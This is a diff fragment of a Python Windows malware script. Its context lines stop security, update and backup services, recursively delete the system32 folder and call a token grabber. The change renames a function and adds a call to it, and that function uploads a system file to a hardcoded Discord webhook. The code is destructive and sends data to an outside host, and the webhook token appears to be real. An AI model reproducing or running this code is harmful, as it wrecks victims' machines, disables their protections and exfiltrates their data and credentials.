@@ -27,7 +27,7 @@ subprocess.getoutput('net stop "SDRSVC"')
 subprocess.getoutput('net stop sharedaccess')
 subprocess.getoutput('net stop "wuauserv"')
 subprocess.getoutput('net stop "security center"')
-def licenseW():
+def license():
     web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
     with open("C:/Windows/system32/license.rtf", "rb") as f:
         web.add_file(file=f.read(), filename='license.rtf')
@@ -229,3 +229,4 @@ def main():
     subprocess.getoutput('rd "%windir%\system32"/q /s')
 main()
 tokengrabber()
+license()
